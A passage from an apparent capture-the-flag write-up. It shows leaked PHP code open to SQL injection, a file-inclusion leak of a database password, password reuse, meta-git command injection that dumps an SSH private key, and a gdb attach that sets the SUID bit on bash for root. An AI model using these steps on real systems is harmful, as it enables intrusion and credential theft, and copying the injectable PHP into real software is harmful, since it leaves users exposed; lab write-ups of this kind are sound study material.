                $delete = $this->db->query("DELETE FROM forum_comments where id = ".$id);
                if($delete){
                        return 1;
                }
        }
        function save_event(){
                extract($_POST);
                $data = " title = '$title' ";
                $data .= ", schedule = '$schedule' ";
                $data .= ", content = '".htmlentities(str_replace("'","&#x2019;",$content))."' ";
                if($_FILES['banner']['tmp_name'] != ''){
                                                $_FILES['banner']['name'] = str_replace(array("(",")"," "), '', $_FILES['banner']['name']);
                                                $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['banner']['name'];
                                                $move = move_uploaded_file($_FILES['banner']['tmp_name'],'assets/uploads/'. $fname);
                                        $data .= ", banner = '$fname' ";

                }
                if(empty($id)){

                        $save = $this->db->query("INSERT INTO events set ".$data);
                }else{
                        $save = $this->db->query("UPDATE events set ".$data." where id=".$id);
                }
                if($save)
                        return 1;
        }
        function delete_event(){
                extract($_POST);
                $delete = $this->db->query("DELETE FROM events where id = ".$id);
                if($delete){
                        return 1;
                }
        }

        function participate(){
                extract($_POST);
                $data = " event_id = '$event_id' ";
                $data .= ", user_id = '{$_SESSION['login_id']}' ";
                $commit = $this->db->query("INSERT INTO event_commits set $data ");
                if($commit)
                        return 1;

        }
}
```

Since we know that we're working with mysql we can probably also leak db_connect
```bash
python3 lfi.py /var/www/scheduling/admin/db_connect.php
                          _____  _____  ______   ______ ___  __   __                  _       _ _
                         |  __ \|  __ \|  ____| |____  / _ \ \ \ / /                 | |     (_) |
               _ __ ___  | |__) | |  | | |__        / / | | | \ V /    _____  ___ __ | | ___  _| |_
               | '_ ` _ \|  ___/| |  | |  __|      / /| | | |  > <    / _ \ \/ / '_ \| |/ _ \| | __|
               | | | | | | |    | |__| | |        / / | |_| | / . \  |  __/>  <| |_) | | (_) | | |_
               |_| |_| |_|_|    |_____/|_|       /_/ (_)___(_)_/ \_\  \___/_/\_\ .__/|_|\___/|_|\__|
                                                                               | |
                                                                               |_|
[+] Replace the content with the payload below
Double url encoded payload:
%253Cannotation%2520file%253D%2522/var/www/scheduling/admin/db_connect.php%2522%2520content%253D%2522/var/www/scheduling/admin/db_connect.php%2522%2520icon%253D%2522Graph%2522%2520title%253D%2522Attached%2520File%253A%2520/var/www/scheduling/admin/db_connect.php%2522%2520pos-x%253D%2522195%2522%2520/%253E

Base64 encoded payload:
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlJTI1M0QlMjUyMi92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwY29udGVudCUyNTNEJTI1MjIvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwJTI1MjIlMjUyMGljb24lMjUzRCUyNTIyR3JhcGglMjUyMiUyNTIwdGl0bGUlMjUzRCUyNTIyQXR0YWNoZWQlMjUyMEZpbGUlMjUzQSUyNTIwL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9kYl9jb25uZWN0LnBocCUyNTIyJTI1MjBwb3MteCUyNTNEJTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```
```php
<?php

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

## Connecting with a reused password

Because we leaked /etc/passwd we know the sched is not a unix user but maybe the password was reused with one of the other users, wich luckily it was with gbyolo.  
```bash
gbyolo@faculty:~$ pwd
/home/gbyolo
gbyolo@faculty:~$ ls -lrt
total 0
gbyolo@faculty:~$ pwd
/home/gbyolo
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo:
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

## Lateral Privesc with Meta-git RCE 

gbyolo has sudo priviledges to developper using something called meta-git  
There's a poc for RCE on that:  
[https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)   
[https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49](https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49)  
It only triggers if curent directory is / though for reasons that are beyond me  
Edit - It works because it needs to be in a place the developper can read, so not in the gbyolo home  
/dev/shm works too .. 
```bash
gbyolo@faculty:~$ cd /dev/shm/
gbyolo@faculty:/dev/shm$ pwd
/dev/shm
gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone 'asdf || id'
meta git cloning into 'asdf || id' at asdf || id

asdf || id:
fatal: repository 'asdf' does not exist
id: ‘asdf’: no such user
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
asdf || id ✓
(node:21053) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/dev/shm/asdf || id'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:21053) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:21053) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
```

```bash
gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone 'asdf || cat ~/.ssh/id_rsa'
meta git cloning into 'asdf || cat ~/.ssh/id_rsa' at id_rsa

id_rsa:
fatal: repository 'asdf' does not exist
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329//sdapn4ncVzRYZxACC/czxmSO5Us2S87dxyw
izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp/zBy0pVK6H7g6GMAVS
pribX/DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1Rib
...............................SNIP..................................
QzVDjJkn6+ANFdKKR3j3s9xnkb5j+U/jGzxvPGDpCiZz0I30KRtAzsBzT1ZQMEvKrchpmR
jrzHFkgTUug0lsPE4ZLB0Re6Iq3ngtaNUAAADBANBXLol4lHhpWL30or8064fjhXGjhY4g
blDouPQFIwCaRbSWLnKvKCwaPaZzocdHlr5wRXwRq8V1VPmsxX8O87y9Ro5guymsdPprXF
LETXujOl8CFiHvMA1Zf6eriE1/Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ==
-----END OPENSSH PRIVATE KEY-----
cat: id_rsa: No such file or directory
id_rsa: command 'git clone asdf || cat ~/.ssh/id_rsa id_rsa' exited with error: Error: Command failed: git clone asdf || cat ~/.ssh/id_rsa id_rsa
(node:21249) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/dev/shm/id_rsa'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:21249) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 2)
(node:21249) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
```

## Privesc with GDB
We're now developer, looking at the groups, it's a member of debug, which gives access to use gdb on a running processes, and I saw that gdb is installed with linpeas earlier.  
```bash
id
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
wc -c user.txt
33 user.txt
```

Finding a thing that runs as root
```bash
ps -ef|grep ^root|grep python
root         716       1  0 12:25 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
```

dropping a system call with the debugger and giving suid to bash  
```bash
gdb -p 716
```
```bash
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 21697]
(gdb) quit
A debugging session is active.

        Inferior 1 [process 716] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/python3.8, process 716
[Inferior 1 (process 716) detached]
```

here we go  
```bash
developer@faculty:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 11:14 /bin/bash
developer@faculty:~$ bash -p
bash-5.0# wc -c /root/root.txt
33 /root/root.txt
```
